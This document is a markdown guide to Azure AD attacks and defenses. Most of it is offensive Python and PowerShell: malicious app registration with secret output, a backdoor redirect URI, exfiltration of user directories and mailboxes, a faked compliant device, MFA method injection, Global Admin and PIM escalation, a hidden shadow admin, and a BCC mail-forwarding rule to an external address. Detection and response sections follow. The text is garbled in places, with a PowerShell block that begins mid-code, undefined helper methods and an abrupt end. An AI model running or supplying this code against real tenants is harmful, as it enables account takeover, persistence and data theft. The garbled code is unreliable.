# Azure AD Security Assessment and Exploitation

Comprehensive guide for testing Azure Active Directory configurations, identifying privilege escalation paths, and detecting supply chain attack vectors using Azure CLI and PowerShell commands.

## Azure AD Reconnaissance and Enumeration

### Tenant Discovery and Information Gathering

```bash
# Install Azure CLI and connect
az login
az account show

# Basic tenant information
az ad signed-in-user show
az account list-locations
az account management-group list

# Enumerate users and groups
az ad user list --output table
az ad group list --output table
az ad sp list --all --output table

# Check tenant-wide settings
az rest --method GET --url "https://graph.microsoft.com/v1.0/organization" --output table
az rest --method GET --url "https://graph.microsoft.com/v1.0/policies/authorizationPolicy" --output json
```

### Application and Service Principal Enumeration

```bash
# List all applications
az ad app list --all --output table

# List service principals with dangerous permissions
az ad sp list --all --query "[?appRoles[?value=='Directory.ReadWrite.All' || value=='RoleManagement.ReadWrite.Directory']]" --output table

# Check application permissions
az ad app list --all --query "[].{AppId:appId,DisplayName:displayName,SignInAudience:signInAudience}" --output table

# Find multi-tenant applications
az ad app list --all --query "[?signInAudience=='AzureADMultipleOrgs' || signInAudience=='PersonalMicrosoftAccount'].{DisplayName:displayName,AppId:appId,SignInAudience:signInAudience}" --output table

# Get application permissions for specific app
APP_ID="00000000-0000-0000-0000-000000000000"
az rest --method GET --url "https://graph.microsoft.com/v1.0/applications(appId='$APP_ID')" --query "requiredResourceAccess" --output json
```

### Role and Permission Analysis

```bash
# List directory roles
az ad directory-role list --output table

# Get members of privileged roles
az ad directory-role member list --role "Global Administrator" --output table
az ad directory-role member list --role "Application Administrator" --output table
az ad directory-role member list --role "Cloud Application Administrator" --output table

# Check user's role assignments
USER_ID=$(az ad signed-in-user show --query id -o tsv)
az rest --method GET --url "https://graph.microsoft.com/v1.0/users/$USER_ID/appRoleAssignments" --output table

# List custom directory roles
az ad directory-role list --query "[?roleTemplateId==null]" --output table

# Check conditional access policies
az rest --method GET --url "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies" --output json
```

# Create service principal
$ServicePrincipal = New-AzureADServicePrincipal `
    -AppId $AppRegistration.AppId

# Generate client secret
$ClientSecret = New-AzureADApplicationPasswordCredential `
    -ObjectId $AppRegistration.ObjectId `
    -CustomKeyIdentifier "ProductionKey" `
    -EndDate (Get-Date).AddYears(2)

Write-Output "Malicious app registered: $($AppRegistration.AppId)"
Write-Output "Client Secret: $($ClientSecret.Value)"
```

#### Supply Chain Persistence via App Permissions

```python
import requests
import json
from datetime import datetime, timedelta

class AzureADSupplyChainAttack:
    def __init__(self, tenant_id, client_id, client_secret):
        self.tenant_id = tenant_id
        self.client_id = client_id
        self.client_secret = client_secret
        self.access_token = self.get_access_token()

    def get_access_token(self):
        """Obtain access token using client credentials"""
        token_url = f"https://login.microsoftonline.com/{self.tenant_id}/oauth2/v2.0/token"

        payload = {
            'grant_type': 'client_credentials',
            'client_id': self.client_id,
            'client_secret': self.client_secret,
            'scope': 'https://graph.microsoft.com/.default'
        }

        response = requests.post(token_url, data=payload)
        return response.json()['access_token']

    def enumerate_supply_chain_targets(self):
        """Enumerate connected organizations and applications"""
        headers = {
            'Authorization': f'Bearer {self.access_token}',
            'Content-Type': 'application/json'
        }

        # Get all service principals (connected apps)
        sp_url = "https://graph.microsoft.com/v1.0/servicePrincipals"
        sp_response = requests.get(sp_url, headers=headers)
        service_principals = sp_response.json().get('value', [])

        supply_chain_targets = []

        for sp in service_principals:
            # Look for supply chain integration apps
            if any(keyword in sp.get('displayName', '').lower() for keyword in
                   ['supplier', 'vendor', 'partner', 'integration', 'connector']):

                # Get app permissions
                app_roles = sp.get('appRoles', [])
                oauth_permissions = sp.get('oauth2PermissionScopes', [])

                supply_chain_targets.append({
                    'app_id': sp.get('appId'),
                    'display_name': sp.get('displayName'),
                    'permissions': {
                        'app_roles': [role['value'] for role in app_roles],
                        'oauth_scopes': [scope['value'] for scope in oauth_permissions]
                    },
                    'risk_level': self.assess_app_risk(app_roles, oauth_permissions)
                })

        return supply_chain_targets

    def assess_app_risk(self, app_roles, oauth_permissions):
        """Assess risk level of application permissions"""
        high_risk_permissions = [
            'Directory.ReadWrite.All',
            'Application.ReadWrite.All',
            'RoleManagement.ReadWrite.Directory',
            'User.ReadWrite.All',
            'Mail.ReadWrite'
        ]

        risk_score = 0
        for role in app_roles:
            if role.get('value') in high_risk_permissions:
                risk_score += 50

        for perm in oauth_permissions:
            if perm.get('value') in high_risk_permissions:
                risk_score += 30

        if risk_score >= 100:
            return 'CRITICAL'
        elif risk_score >= 50:
            return 'HIGH'
        else:
            return 'MEDIUM'

    def plant_supply_chain_backdoor(self, target_app_id):
        """Plant backdoor in supply chain application"""
        headers = {
            'Authorization': f'Bearer {self.access_token}',
            'Content-Type': 'application/json'
        }

        # Add additional redirect URI for backdoor access
        backdoor_redirect = "https://legitimate-looking-domain.com/oauth/callback"

        patch_data = {
            "web": {
                "redirectUris": [
                    "https://original-app.com/callback",
                    backdoor_redirect  # Malicious redirect URI
                ]
            }
        }

        patch_url = f"https://graph.microsoft.com/v1.0/applications/{target_app_id}"
        response = requests.patch(patch_url, headers=headers, json=patch_data)

        if response.status_code == 200:
            print(f"Backdoor planted in application: {target_app_id}")
            return True
        else:
            print(f"Failed to plant backdoor: {response.text}")
            return False

    def exfiltrate_organizational_data(self):
        """Exfiltrate sensitive organizational data"""
        headers = {
            'Authorization': f'Bearer {self.access_token}',
            'Content-Type': 'application/json'
        }

        exfiltrated_data = {}

        # Extract user directory
        users_url = "https://graph.microsoft.com/v1.0/users?$select=displayName,userPrincipalName,jobTitle,department,manager"
        users_response = requests.get(users_url, headers=headers)
        exfiltrated_data['users'] = users_response.json().get('value', [])

        # Extract group memberships
        groups_url = "https://graph.microsoft.com/v1.0/groups?$select=displayName,description,members"
        groups_response = requests.get(groups_url, headers=headers)
        exfiltrated_data['groups'] = groups_response.json().get('value', [])

        # Extract application inventory
        apps_url = "https://graph.microsoft.com/v1.0/applications?$select=displayName,appId,publisherDomain"
        apps_response = requests.get(apps_url, headers=headers)
        exfiltrated_data['applications'] = apps_response.json().get('value', [])

        return exfiltrated_data
```

### Conditional Access Bypass

Sophisticated attackers target Conditional Access policies to maintain persistent access across supply chain compromises.

#### Device Compliance Bypass

```python
class ConditionalAccessBypass:
    def __init__(self, access_token):
        self.access_token = access_token
        self.graph_url = "https://graph.microsoft.com/v1.0"

    def enumerate_ca_policies(self):
        """Enumerate Conditional Access policies"""
        headers = {
            'Authorization': f'Bearer {self.access_token}',
            'Content-Type': 'application/json'
        }

        ca_url = f"{self.graph_url}/identity/conditionalAccess/policies"
        response = requests.get(ca_url, headers=headers)
        policies = response.json().get('value', [])

        vulnerable_policies = []

        for policy in policies:
            if self.analyze_policy_weaknesses(policy):
                vulnerable_policies.append({
                    'id': policy.get('id'),
                    'displayName': policy.get('displayName'),
                    'state': policy.get('state'),
                    'conditions': policy.get('conditions'),
                    'grantControls': policy.get('grantControls'),
                    'weaknesses': self.identify_weaknesses(policy)
                })

        return vulnerable_policies

    def analyze_policy_weaknesses(self, policy):
        """Analyze CA policy for potential bypass opportunities"""
        weaknesses = []
        conditions = policy.get('conditions', {})

        # Check for weak location conditions
        locations = conditions.get('locations', {})
        if locations.get('includeLocations') == ['All'] and not locations.get('excludeLocations'):
            weaknesses.append('No location restrictions')

        # Check for weak device conditions
        devices = conditions.get('devices', {})
        if not devices.get('includeDevices') or 'All' in devices.get('includeDevices', []):
            weaknesses.append('No device restrictions')

        # Check for application scope
        applications = conditions.get('applications', {})
        if 'All' in applications.get('includeApplications', []):
            weaknesses.append('Applies to all applications')

        return len(weaknesses) > 0

    def create_compliant_device_identity(self):
        """Create fake compliant device identity"""
        device_registration = {
            "accountEnabled": True,
            "alternativeSecurityIds": [
                {
                    "type": 2,
                    "key": self.generate_device_key()
                }
            ],
            "approximateLastSignInDateTime": datetime.utcnow().isoformat(),
            "deviceId": self.generate_device_id(),
            "deviceMetadata": "compliant=true;managed=true",
            "displayName": "DESKTOP-COMPLIANCE-01",
            "isCompliant": True,
            "isManaged": True,
            "operatingSystem": "Windows",
            "operatingSystemVersion": "10.0.19044.1865",
            "trustType": "Domain"
        }

        headers = {
            'Authorization': f'Bearer {self.access_token}',
            'Content-Type': 'application/json'
        }

        devices_url = f"{self.graph_url}/devices"
        response = requests.post(devices_url, headers=headers, json=device_registration)

        if response.status_code == 201:
            return response.json()
        else:
            print(f"Device registration failed: {response.text}")
            return None

    def bypass_mfa_requirements(self, target_user_id):
        """Attempt to bypass MFA requirements"""
        # Method 1: Register new authentication method
        auth_methods_url = f"{self.graph_url}/users/{target_user_id}/authentication/methods"

        new_method = {
            "@odata.type": "microsoft.graph.microsoftAuthenticatorAuthenticationMethod",
            "displayName": "Backup Authenticator",
            "phoneAppVersion": "6.2022.6.1"
        }

        headers = {
            'Authorization': f'Bearer {self.access_token}',
            'Content-Type': 'application/json'
        }

        response = requests.post(auth_methods_url, headers=headers, json=new_method)

        if response.status_code == 201:
            print("Successfully registered backup MFA method")
            return response.json()

        return None
```

## Advanced Privilege Escalation

### Global Administrator Escalation

```python
class AzureADPrivilegeEscalation:
    def __init__(self, access_token):
        self.access_token = access_token
        self.graph_url = "https://graph.microsoft.com/v1.0"

    def escalate_via_application_admin(self):
        """Escalate privileges using Application Administrator role"""
        headers = {
            'Authorization': f'Bearer {self.access_token}',
            'Content-Type': 'application/json'
        }

        # Step 1: Create new application with high privileges
        app_data = {
            "displayName": "Azure Management Tools",
            "description": "Internal Azure management utilities",
            "signInAudience": "AzureADMyOrg",
            "requiredResourceAccess": [
                {
                    "resourceAppId": "00000003-0000-0000-c000-000000000000",  # MS Graph
                    "resourceAccess": [
                        {
                            "id": "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8",  # RoleManagement.ReadWrite.Directory
                            "type": "Role"
                        },
                        {
                            "id": "06b708a9-e830-4db3-a914-8e69da51d44f",  # AppRoleAssignment.ReadWrite.All
                            "type": "Role"
                        }
                    ]
                }
            ]
        }

        # Create application
        app_response = requests.post(f"{self.graph_url}/applications",
                                   headers=headers, json=app_data)

        if app_response.status_code != 201:
            print(f"Application creation failed: {app_response.text}")
            return False

        app_id = app_response.json()['appId']
        app_object_id = app_response.json()['id']

        # Step 2: Create service principal
        sp_data = {"appId": app_id}
        sp_response = requests.post(f"{self.graph_url}/servicePrincipals",
                                  headers=headers, json=sp_data)

        if sp_response.status_code != 201:
            print(f"Service principal creation failed: {sp_response.text}")
            return False

        sp_object_id = sp_response.json()['id']

        # Step 3: Grant admin consent (requires Application Administrator)
        consent_url = f"{self.graph_url}/servicePrincipals/{sp_object_id}/appRoleAssignments"

        # Assign RoleManagement.ReadWrite.Directory
        role_assignment = {
            "principalId": sp_object_id,
            "resourceId": "00000003-0000-0000-c000-000000000000",
            "appRoleId": "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8"
        }

        consent_response = requests.post(consent_url, headers=headers, json=role_assignment)

        if consent_response.status_code == 201:
            print(f"Privilege escalation successful. App ID: {app_id}")
            return app_id
        else:
            print(f"Privilege escalation failed: {consent_response.text}")
            return False

    def assign_global_admin_role(self, app_id):
        """Assign Global Administrator role using escalated privileges"""
        headers = {
            'Authorization': f'Bearer {self.access_token}',
            'Content-Type': 'application/json'
        }

        # Get Global Administrator role template ID
        global_admin_role_id = "62e90394-69f5-4237-9190-012177145e10"

        # Get current user ID
        me_response = requests.get(f"{self.graph_url}/me", headers=headers)
        current_user_id = me_response.json()['id']

        # Assign Global Admin role
        role_assignment = {
            "@odata.type": "microsoft.graph.unifiedRoleAssignment",
            "roleDefinitionId": global_admin_role_id,
            "principalId": current_user_id,
            "directoryScopeId": "/"
        }

        assignment_url = f"{self.graph_url}/roleManagement/directory/roleAssignments"
        assignment_response = requests.post(assignment_url, headers=headers, json=role_assignment)

        if assignment_response.status_code == 201:
            print("Global Administrator role assigned successfully")
            return True
        else:
            print(f"Role assignment failed: {assignment_response.text}")
            return False

    def escalate_via_pim_abuse(self, target_role_id):
        """Abuse Privileged Identity Management for escalation"""
        headers = {
            'Authorization': f'Bearer {self.access_token}',
            'Content-Type': 'application/json'
        }

        # Activate privileged role through PIM
        pim_url = "https://graph.microsoft.com/beta/privilegedAccess/azureAD/roleAssignmentRequests"

        activation_request = {
            "assignmentState": "Active",
            "type": "UserAdd",
            "reason": "Urgent security review required",
            "roleDefinitionId": target_role_id,
            "subjectId": self.get_current_user_id(),
            "schedule": {
                "type": "Once",
                "startDateTime": datetime.utcnow().isoformat(),
                "duration": "PT8H"  # 8 hours
            }
        }

        response = requests.post(pim_url, headers=headers, json=activation_request)

        if response.status_code == 201:
            print("PIM role activation successful")
            return response.json()
        else:
            print(f"PIM activation failed: {response.text}")
            return None
```

### Directory Synchronization Abuse

```python
class DirectorySyncAbuse:
    def __init__(self, access_token):
        self.access_token = access_token
        self.graph_url = "https://graph.microsoft.com/v1.0"

    def abuse_hybrid_identity(self):
        """Abuse hybrid identity synchronization"""
        headers = {
            'Authorization': f'Bearer {self.access_token}',
            'Content-Type': 'application/json'
        }

        # Step 1: Identify synchronized users
        sync_users = self.identify_synced_users()

        # Step 2: Modify on-premises attributes that sync to cloud
        for user in sync_users[:5]:  # Limit to first 5 users
            self.modify_synced_attributes(user['id'])

    def identify_synced_users(self):
        """Identify users synchronized from on-premises"""
        headers = {
            'Authorization': f'Bearer {self.access_token}',
            'Content-Type': 'application/json'
        }

        # Look for users with immutableId (indicates sync from on-prem)
        users_url = f"{self.graph_url}/users?$filter=immutableId ne null&$select=id,userPrincipalName,immutableId,onPremisesSecurityIdentifier"

        response = requests.get(users_url, headers=headers)

        if response.status_code == 200:
            return response.json().get('value', [])
        else:
            return []

    def create_shadow_admin(self):
        """Create shadow admin account via directory sync manipulation"""
        # This would typically require on-premises access
        # Documenting the technique for awareness

        shadow_user_attributes = {
            "userPrincipalName": "backup-admin@company.com",
            "displayName": "Backup Administrator",
            "givenName": "Backup",
            "surname": "Administrator",
            "jobTitle": "System Administrator",
            "department": "IT Operations",
            "accountEnabled": True,
            "passwordProfile": {
                "forceChangePasswordNextSignIn": False,
                "password": "ComplexPassword123!"
            },
            # On-premises attributes that would sync
            "extensionAttribute1": "shadow-admin-marker",
            "extensionAttribute2": str(datetime.utcnow().timestamp())
        }

        headers = {
            'Authorization': f'Bearer {self.access_token}',
            'Content-Type': 'application/json'
        }

        # This would normally be created on-premises and synced
        # But documenting the cloud-side result
        create_url = f"{self.graph_url}/users"
        response = requests.post(create_url, headers=headers, json=shadow_user_attributes)

        if response.status_code == 201:
            user_id = response.json()['id']
            print(f"Shadow admin created: {user_id}")

            # Assign roles after creation
            self.assign_hidden_privileges(user_id)

            return user_id
        else:
            print(f"Shadow admin creation failed: {response.text}")
            return None

    def assign_hidden_privileges(self, user_id):
        """Assign privileges in a way that's difficult to detect"""
        headers = {
            'Authorization': f'Bearer {self.access_token}',
            'Content-Type': 'application/json'
        }

        # Instead of Global Admin, use multiple specific roles
        stealth_roles = [
            "729827e3-9c14-49f7-bb1b-9608f156bbb8",  # Helpdesk Administrator
            "f28a1f50-f6e7-4571-818b-6a12f2af6b6c",  # SharePoint Administrator
            "fe930be7-5e62-47db-91af-98c3a49a38b1",  # User Administrator
        ]

        for role_id in stealth_roles:
            role_assignment = {
                "@odata.type": "microsoft.graph.unifiedRoleAssignment",
                "roleDefinitionId": role_id,
                "principalId": user_id,
                "directoryScopeId": "/"
            }

            assignment_url = f"{self.graph_url}/roleManagement/directory/roleAssignments"
            requests.post(assignment_url, headers=headers, json=role_assignment)

        print(f"Stealth roles assigned to user: {user_id}")
```

## Microsoft 365 Security Bypasses

### Exchange Online Exploitation

```python
class ExchangeOnlineExploit:
    def __init__(self, access_token):
        self.access_token = access_token
        self.graph_url = "https://graph.microsoft.com/v1.0"

    def create_mail_flow_rule_backdoor(self):
        """Create mail flow rule for persistent access"""
        headers = {
            'Authorization': f'Bearer {self.access_token}',
            'Content-Type': 'application/json'
        }

        # Create transport rule that forwards copies of emails
        transport_rule = {
            "name": "Security Compliance Archive",
            "description": "Automatic archiving for security compliance",
            "enabled": True,
            "priority": 0,
            "conditions": [
                {
                    "property": "From",
                    "operator": "Contains",
                    "values": ["@company.com"]
                }
            ],
            "actions": [
                {
                    "actionType": "BlindCopyTo",
                    "recipients": ["archive@external-security-vendor.com"]
                }
            ]
        }

        # Note: This would require Exchange Online PowerShell in reality
        print("Mail flow rule backdoor concept documented")
        return transport_rule

    def abuse_application_impersonation(self):
        """Abuse application impersonation for mailbox access"""
        headers = {
            'Authorization': f'Bearer {self.access_token}',
            'Content-Type': 'application/json'
        }

        # Get all users' mailboxes
        users_url = f"{self.graph_url}/users?$select=id,userPrincipalName,mail"
        users_response = requests.get(users_url, headers=headers)
        users = users_response.json().get('value', [])

        exfiltrated_emails = []

        for user in users[:10]:  # Limit to first 10 users
            user_id = user['id']

            # Access user's mailbox
            messages_url = f"{self.graph_url}/users/{user_id}/messages?$top=50&$select=subject,from,receivedDateTime,bodyPreview"

            try:
                messages_response = requests.get(messages_url, headers=headers)
                if messages_response.status_code == 200:
                    messages = messages_response.json().get('value', [])

                    for message in messages:
                        # Look for sensitive content
                        if self.is_sensitive_email(message):
                            exfiltrated_emails.append({
                                'user': user['userPrincipalName'],
                                'subject': message.get('subject'),
                                'from': message.get('from', {}).get('emailAddress', {}).get('address'),
                                'received': message.get('receivedDateTime'),
                                'preview': message.get('bodyPreview')
                            })

            except Exception as e:
                print(f"Failed to access mailbox for {user['userPrincipalName']}: {e}")

        return exfiltrated_emails

    def is_sensitive_email(self, message):
        """Identify potentially sensitive emails"""
        sensitive_keywords = [
            'confidential', 'secret', 'password', 'credentials',
            'contract', 'financial', 'merger', 'acquisition',
            'legal', 'attorney', 'privileged'
        ]

        subject = message.get('subject', '').lower()
        preview = message.get('bodyPreview', '').lower()

        return any(keyword in subject or keyword in preview
                  for keyword in sensitive_keywords)
```

## Detection and Monitoring

### Advanced Threat Detection

```python
import json
from datetime import datetime, timedelta

class AzureADThreatDetection:
    def __init__(self, tenant_id, client_id, client_secret):
        self.tenant_id = tenant_id
        self.client_id = client_id
        self.client_secret = client_secret
        self.access_token = self.get_access_token()

    def analyze_sign_in_anomalies(self):
        """Analyze sign-in logs for supply chain attack indicators"""
        headers = {
            'Authorization': f'Bearer {self.access_token}',
            'Content-Type': 'application/json'
        }

        # Get sign-in logs from past 24 hours
        end_time = datetime.utcnow()
        start_time = end_time - timedelta(hours=24)

        signin_url = f"https://graph.microsoft.com/v1.0/auditLogs/signIns"
        signin_url += f"?$filter=createdDateTime ge {start_time.isoformat()}Z"
        signin_url += f" and createdDateTime le {end_time.isoformat()}Z"

        response = requests.get(signin_url, headers=headers)
        sign_ins = response.json().get('value', [])

        anomalies = []

        for signin in sign_ins:
            anomaly_score = self.calculate_anomaly_score(signin)
            if anomaly_score > 70:
                anomalies.append({
                    'user': signin.get('userDisplayName'),
                    'app': signin.get('appDisplayName'),
                    'location': signin.get('location'),
                    'risk_score': anomaly_score,
                    'indicators': self.identify_risk_indicators(signin)
                })

        return anomalies

    def calculate_anomaly_score(self, signin):
        """Calculate risk score for sign-in event"""
        score = 0

        # Check for supply chain risk indicators
        risk_factors = {
            'new_application': 25,
            'suspicious_location': 30,
            'unusual_time': 15,
            'failed_then_success': 40,
            'high_risk_app': 35,
            'impossible_travel': 50
        }

        for factor, weight in risk_factors.items():
            if self.check_risk_factor(signin, factor):
                score += weight

        return min(score, 100)

    def detect_application_abuse(self):
        """Detect abuse of application registrations"""
        headers = {
            'Authorization': f'Bearer {self.access_token}',
            'Content-Type': 'application/json'
        }

        # Get all applications
        apps_url = "https://graph.microsoft.com/v1.0/applications"
        apps_response = requests.get(apps_url, headers=headers)
        applications = apps_response.json().get('value', [])

        suspicious_apps = []

        for app in applications:
            risk_indicators = self.analyze_app_security_posture(app)

            if len(risk_indicators) > 2:
                suspicious_apps.append({
                    'app_id': app.get('appId'),
                    'display_name': app.get('displayName'),
                    'created': app.get('createdDateTime'),
                    'risk_indicators': risk_indicators
                })

        return suspicious_apps

    def analyze_app_security_posture(self, app):
        """Analyze application for security risks"""
        indicators = []

        # Check for overprivileged permissions
        resource_access = app.get('requiredResourceAccess', [])
        for resource in resource_access:
            for access in resource.get('resourceAccess', []):
                permission_id = access.get('id')
                if permission_id in self.get_high_risk_permissions():
                    indicators.append(f'High-risk permission: {permission_id}')

        # Check for suspicious redirect URIs
        web_config = app.get('web', {})
        redirect_uris = web_config.get('redirectUris', [])
        for uri in redirect_uris:
            if self.is_suspicious_redirect_uri(uri):
                indicators.append(f'Suspicious redirect URI: {uri}')

        # Check application age vs permissions
        created_date = app.get('createdDateTime')
        if created_date:
            app_age = datetime.utcnow() - datetime.fromisoformat(created_date.replace('Z', '+00:00'))
            if app_age.days < 7 and len(resource_access) > 0:
                indicators.append('New application with extensive permissions')

        return indicators

    def get_high_risk_permissions(self):
        """Get list of high-risk permission IDs"""
        return [
            '9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8',  # RoleManagement.ReadWrite.Directory
            '06b708a9-e830-4db3-a914-8e69da51d44f',  # AppRoleAssignment.ReadWrite.All
            '1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9',  # Application.ReadWrite.All
            'dbb9058a-0e50-45d7-ae91-66909b72db8f',  # User.ReadWrite.All
            '741f803b-c850-494e-b5df-cde7c675a1ca',  # Directory.ReadWrite.All
        ]

    def monitor_privileged_operations(self):
        """Monitor for privileged operations that could indicate compromise"""
        headers = {
            'Authorization': f'Bearer {self.access_token}',
            'Content-Type': 'application/json'
        }

        # Monitor audit logs for privileged activities
        end_time = datetime.utcnow()
        start_time = end_time - timedelta(hours=24)

        audit_url = f"https://graph.microsoft.com/v1.0/auditLogs/directoryAudits"
        audit_url += f"?$filter=activityDateTime ge {start_time.isoformat()}Z"

        response = requests.get(audit_url, headers=headers)
        audit_logs = response.json().get('value', [])

        privileged_activities = []

        for log in audit_logs:
            activity = log.get('activityDisplayName', '')

            # Look for supply chain attack indicators
            if any(indicator in activity.lower() for indicator in [
                'add application', 'add service principal', 'add app role assignment',
                'add member to role', 'update application', 'consent to application'
            ]):
                privileged_activities.append({
                    'activity': activity,
                    'initiated_by': log.get('initiatedBy', {}),
                    'target_resources': log.get('targetResources', []),
                    'timestamp': log.get('activityDateTime'),
                    'correlation_id': log.get('correlationId')
                })

        return privileged_activities
```

## Incident Response Playbook

### Azure AD Compromise Response

```python
class AzureADIncidentResponse:
    def __init__(self, access_token):
        self.access_token = access_token
        self.graph_url = "https://graph.microsoft.com/v1.0"

    def emergency_lockdown(self, compromise_indicators):
        """Perform emergency lockdown based on compromise indicators"""
        headers = {
            'Authorization': f'Bearer {self.access_token}',
            'Content-Type': 'application/json'
        }

        response_actions = []

        # 1. Disable compromised applications
        for app_id in compromise_indicators.get('compromised_apps', []):
            self.disable_application(app_id)
            response_actions.append(f"Disabled application: {app_id}")

        # 2. Revoke user sessions
        for user_id in compromise_indicators.get('compromised_users', []):
            self.revoke_user_sessions(user_id)
            response_actions.append(f"Revoked sessions for user: {user_id}")

        # 3. Block suspicious sign-ins
        if 'suspicious_locations' in compromise_indicators:
            self.create_emergency_ca_policy(compromise_indicators['suspicious_locations'])
            response_actions.append("Created emergency Conditional Access policy")

        return response_actions

    def disable_application(self, app_id):
        """Disable compromised application"""
        headers = {
            'Authorization': f'Bearer {self.access_token}',
            'Content-Type': 'application/json'
        }

        # Disable the application
        app_update = {"accountEnabled": False}

        update_url = f"{self.graph_url}/applications/{app_id}"
        response = requests.patch(update_url, headers=headers, json=app_update)

        if response.status_code == 204:
            print(f"Successfully disabled application: {app_id}")
        else:
            print(f"Failed to disable application {app_id}: {response.text}")

    def revoke_user_sessions(self, user_id):
        """Revoke all active sessions for a user"""
        headers = {
            'Authorization': f'Bearer {self.access_token}',
            'Content-Type': 'application/json'
        }

        # Revoke refresh tokens
        revoke_url = f"{self.graph_url}/users/{user_id}/revokeSignInSessions"
        response = requests.post(revoke_url, headers=headers)

        if response.status_code == 200:
            print(f"Successfully revoked sessions for user: {user_id}")
        else:
            print(f"Failed to revoke sessions for user {user_id}: {response.text}")

    def create_emergency_ca_policy(self, suspicious_locations):
        """Create emergency Conditional Access policy to block suspicious locations"""
        headers = {
            'Authorization': f'Bearer {self.access_token}',
            'Content-Type': 'application/json'
        }

        emergency_policy = {
            "displayName": "Emergency - Block Suspicious Locations",
            "state": "enabled",
            "conditions": {
                "applications": {
                    "includeApplications": ["All"]
                },
                "users": {
                    "includeUsers": ["All"]
                },
                "locations": {
                    "includeLocations": suspicious_locations
                }
            },
            "grantControls": {
                "operator": "OR",
                "builtInControls": ["block"]
            }
        }

        ca_url = f"{self.graph_url}/identity/conditionalAccess/policies"
        response = requests.post(ca_url, headers=headers, json=emergency_policy)

        if response.status_code == 201:
            print("Emergency Conditional Access policy created")
            return response.json()['id']
        else:
            print(f"Failed to create emergency CA policy: {response.text}")
            return None

    def collect_forensic_evidence(self, incident_timeframe):
        """Collect forensic evidence for investigation"""
        evidence = {}

        # Collect audit logs
        evidence['audit_logs'] = self.collect_audit_logs(incident_timeframe)

        # Collect sign-in logs
        evidence['signin_logs'] = self.collect_signin_logs(incident_timeframe)

        # Collect application changes
        evidence['app_changes'] = self.collect_application_changes(incident_timeframe)

        # Export evidence
        evidence_file = f"azure_ad_incident_evidence_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.json"
        with open(evidence_file, 'w') as f:
            json.dump(evidence, f, indent=2, default=str)

        print(f"Forensic evidence collected: {evidence_file}")
        return evidence_file
```

## Defense Strategies

### Zero Trust Implementation

```python
class AzureADZeroTrust:
    def __init__(self, access_token):
        self.access_token = access_token
        self.graph_url = "https://graph.microsoft.com/v1.0"

    def implement_zero_trust_policies(self):
        """Implement comprehensive Zero Trust policies"""
        policies = []

        # 1. Require MFA for all users
        mfa_policy = self.create_mfa_policy()
        policies.append(mfa_policy)

        # 2. Block legacy authentication
        legacy_auth_policy = self.create_legacy_auth_block_policy()
        policies.append(legacy_auth_policy)

        # 3. Require device compliance
        device_compliance_policy = self.create_device_compliance_policy()
        policies.append(device_compliance_policy)

        # 4. High-risk sign-in protection
        risk_policy = self.create_sign_in_risk_policy()
        policies.append(risk_policy)

        return policies

    def create_mfa_policy(self):
        """Create MFA requirement policy"""
        mfa_policy = {
            "displayName": "Zero Trust - Require MFA for All Users",
            "state": "enabled",
            "conditions": {
                "applications": {
                    "includeApplications": ["All"]
                },
                "users": {
                    "includeUsers": ["All"],
                    "excludeUsers": ["emergency-break-glass-account-id"]
                }
            },
            "grantControls": {
                "operator": "OR",
                "builtInControls": ["mfa"]
            }
        }
        return mfa_policy

    def create_application_protection_policy(self):
        """Create policy to protect against malicious applications"""
        app_protection_policy = {
            "displayName": "Zero Trust - Application Protection",
            "state": "enabled",
            "conditions": {
                "applications": {
                    "includeApplications": ["All"]
                },
                "users": {
                    "includeUsers": ["All"]
                }
            },
            "sessionControls": {
                "applicationEnforcedRestrictions": {
                    "isEnabled": True
                },
                "cloudAppSecurity": {
                    "isEnabled": True,
                    "cloudAppSecurityType": "mcasConfigured"
                }
            },
            "grantControls": {
                "operator": "AND",
                "builtInControls": ["mfa", "compliantDevice"]
            }
        }
        return app_protection_policy

    def implement_privileged_access_workstations(self):
        """Configure Privileged Access Workstations (PAW) policy"""
        paw_policy = {
            "displayName": "Zero Trust - Privileged Access Workstations",
            "state": "enabled",
            "conditions": {
                "applications": {
                    "includeApplications": [
                        "797f4846-ba00-4fd7-ba43-dac1f8f63013",  # Azure portal
                        "c44b4083-3bb0-49c1-b47d-974e53cbdf3c"   # Azure admin center
                    ]
                },
                "users": {
                    "includeRoles": [
                        "62e90394-69f5-4237-9190-012177145e10",  # Global Administrator
                        "194ae4cb-b126-40b2-bd5b-6091b380977d"   # Security Administrator
                    ]
                }
            },
            "grantControls": {
                "operator": "AND",
                "builtInControls": ["mfa", "compliantDevice"],
                "customAuthenticationFactors": [],
                "termsOfUse": []
            },
            "sessionControls": {
                "applicationEnforcedRestrictions": {"isEnabled": True}
            }
        }
        return paw_policy
```

## Tools and Automation

### PowerShell Tools for Azure AD Security

```powershell
# Azure AD Security Assessment Script

# Connect to Azure AD
Connect-AzureAD

# Function to assess application security
function Assess-ApplicationSecurity {
    param(
        [string]$ApplicationId
    )

    $app = Get-AzureADApplication -Filter "AppId eq '$ApplicationId'"
    $servicePrincipal = Get-AzureADServicePrincipal -Filter "AppId eq '$ApplicationId'"

    $assessment = @{
        'ApplicationId' = $ApplicationId
        'DisplayName' = $app.DisplayName
        'CreatedDateTime' = $app.CreatedDateTime
        'RiskScore' = 0
        'Issues' = @()
    }

    # Check for high-risk permissions
    $highRiskPermissions = @(
        '9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8',  # RoleManagement.ReadWrite.Directory
        '1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9',  # Application.ReadWrite.All
        '06b708a9-e830-4db3-a914-8e69da51d44f'   # AppRoleAssignment.ReadWrite.All
    )

    foreach ($permission in $app.RequiredResourceAccess) {
        foreach ($access in $permission.ResourceAccess) {
            if ($access.Id -in $highRiskPermissions) {
                $assessment.RiskScore += 30
                $assessment.Issues += "High-risk permission: $($access.Id)"
            }
        }
    }

    # Check for suspicious redirect URIs
    if ($app.ReplyUrls) {
        foreach ($uri in $app.ReplyUrls) {
            if ($uri -match "localhost|127\.0\.0\.1|ngrok|tunnel") {
                $assessment.RiskScore += 20
                $assessment.Issues += "Suspicious redirect URI: $uri"
            }
        }
    }

    return $assessment
}

# Function to check for overprivileged users
function Find-OverprivilegedUsers {
    $globalAdmins = Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember

    $report = @()
    foreach ($admin in $globalAdmins) {
